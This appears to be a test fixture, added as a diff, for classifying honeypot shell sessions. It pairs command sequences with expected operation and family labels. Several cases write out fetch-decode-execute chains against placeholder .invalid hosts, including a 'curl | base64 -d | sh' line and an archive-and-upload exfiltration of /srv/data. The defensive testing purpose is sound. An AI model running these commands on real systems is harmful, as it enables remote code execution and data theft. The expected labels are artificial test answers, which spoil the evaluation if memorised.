@@ -1,0 +1,91 @@
+{
+  "schema_version": "typed_cross_family_relationship_evaluation.v1",
+  "evaluation_id": "cowrie-cross-family-relationships-20260730",
+  "expected_labels_frozen_before_execution": true,
+  "cases": [
+    {
+      "case_id": "CFR-001",
+      "events": [
+        ["wget https://stage.invalid/a.b64 -O /tmp/a.b64", "success"],
+        ["base64 -d /tmp/a.b64 > /tmp/a.sh", "success"],
+        ["sh /tmp/a.sh", "success"]
+      ],
+      "expected_operations": ["remote_content_access", "transfer_attempt", "decode_transform", "file_write", "execution_attempt"],
+      "expected_families": ["execution", "transfer_attempt"],
+      "expected_action_families": ["execution"]
+    },
+    {
+      "case_id": "CFR-002",
+      "events": [
+        ["curl https://stage.invalid/b.b64 -o /tmp/b.b64", "success"],
+        ["base64 -d /tmp/b.b64 > /tmp/b.sh", "failure"],
+        ["bash /tmp/b.sh", "success"]
+      ],
+      "expected_operations": ["remote_content_access", "transfer_attempt", "decode_transform", "file_write", "execution_attempt"],
+      "expected_families": ["execution", "transfer_attempt"],
+      "expected_action_families": ["execution"]
+    },
+    {
+      "case_id": "CFR-003",
+      "events": [
+        ["wget https://stage.invalid/c.b64 -O /tmp/c.b64", "success"],
+        ["base64 -d /tmp/c.b64 > /tmp/c.sh", "success"]
+      ],
+      "expected_operations": ["remote_content_access", "transfer_attempt", "decode_transform", "file_write"],
+      "expected_families": ["transfer_attempt"],
+      "expected_action_families": []
+    },
+    {
+      "case_id": "CFR-004",
+      "events": [
+        ["sh /tmp/d.sh", "success"],
+        ["wget https://stage.invalid/d.b64 -O /tmp/d.b64", "success"],
+        ["base64 -d /tmp/d.b64 > /tmp/d.sh", "success"]
+      ],
+      "expected_operations": ["execution_attempt", "remote_content_access", "transfer_attempt", "decode_transform", "file_write"],
+      "expected_families": ["execution", "transfer_attempt"],
+      "expected_action_families": ["execution"]
+    },
+    {
+      "case_id": "CFR-005",
+      "events": [
+        ["find /srv/data -type f", "success"],
+        ["tar -czf /tmp/data.tgz /srv/data", "success"],
+        ["curl --upload-file /tmp/data.tgz https://sink.invalid/data", "success"]
+      ],
+      "expected_operations": ["filesystem_search", "file_read", "archive_create", "unknown"],
+      "expected_families": ["inspection"],
+      "expected_action_families": []
+    },
+    {
+      "case_id": "CFR-006",
+      "events": [
+        ["find /opt/reports -type f", "success"],
+        ["tar -cf /tmp/reports.tar /opt/reports", "success"],
+        ["curl https://sink.invalid/response", "success"]
+      ],
+      "expected_operations": ["filesystem_search", "file_read", "archive_create", "remote_content_access", "transfer_attempt"],
+      "expected_families": ["inspection", "transfer_attempt"],
+      "expected_action_families": []
+    },
+    {
+      "case_id": "CFR-007",
+      "events": [
+        ["curl https://pipe.invalid/a.b64 | base64 -d | sh", "success"]
+      ],
+      "expected_operations": ["remote_content_access", "remote_content_pipe_source", "transfer_attempt", "decode_transform", "shell_pipe_execution_attempt"],
+      "expected_families": [],
+      "expected_action_families": []
+    },
+    {
+      "case_id": "CFR-008",
+      "events": [
+        ["mkdir /tmp/short-lived", "success"],
+        ["rm /tmp/short-lived", "success"]
+      ],
+      "expected_operations": ["directory_create", "file_delete"],
+      "expected_families": ["filesystem"],
+      "expected_action_families": []
+    }
+  ]
+}
